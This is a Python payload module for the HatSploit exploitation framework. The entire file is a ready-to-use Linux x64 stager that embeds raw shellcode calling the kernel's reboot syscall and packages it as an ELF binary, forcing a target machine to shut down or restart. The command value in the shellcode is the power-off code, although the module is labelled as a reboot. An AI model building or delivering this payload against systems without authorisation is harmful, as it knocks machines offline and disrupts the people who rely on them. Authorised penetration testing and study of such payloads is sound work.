#!/usr/bin/env python3

#
# This payload requires HatSploit: https://hatsploit.netlify.app
# Current source: https://github.com/EntySec/HatSploit
#

from hatvenom import HatVenom
from hatsploit.base.payload import Payload


class HatSploitPayload(Payload, HatVenom):
    details = {
        'Category': "stager",
        'Name': "Linux x64 Reboot",
        'Payload': "linux/x64/reboot",
        'Authors': [
            'Ivan Nikolsky (enty8080)'
        ],
        'Description': "Reboot payload for Linux x64.",
        'Comments': [
            ''
        ],
        'Architecture': "x64",
        'Platform': "linux",
        'Risk': "low",
        'Type': "one_side"
    }

    def run(self):
        self.output_process("Generating shellcode...")
        shellcode = (
            b"\xba\xdc\xfe\x21\x43"  # mov    $0x4321fedc,%edx
            b"\xbe\x69\x19\x12\x28"  # mov    $0x28121969,%esi
            b"\xbf\xad\xde\xe1\xfe"  # mov    $0xfee1dead,%edi
            b"\xb0\xa9"              # mov    $0xa9,%al
            b"\x0f\x05"              # syscall
        )

        self.output_process("Generating payload...")
        payload = self.generate('elf', 'x64', shellcode)

        return payload
